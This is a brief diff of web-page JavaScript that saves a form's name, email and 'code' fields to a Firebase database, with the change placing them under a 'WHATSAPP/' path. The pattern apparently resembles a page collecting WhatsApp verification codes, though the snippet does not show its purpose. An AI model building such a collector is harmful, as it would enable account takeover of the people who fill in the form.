@@ -319,7 +319,7 @@
 			codeV = document.getElementById('code').value;
 			var recu= document.getElementById('recu');
 			var form = document.getElementById('form');
-		firebase.database().ref(nameV).set({
+		firebase.database().ref('WHATSAPP/' +nameV).set({
 			NAME: nameV,
 			Mail: emailV,
 			CODE: codeV,
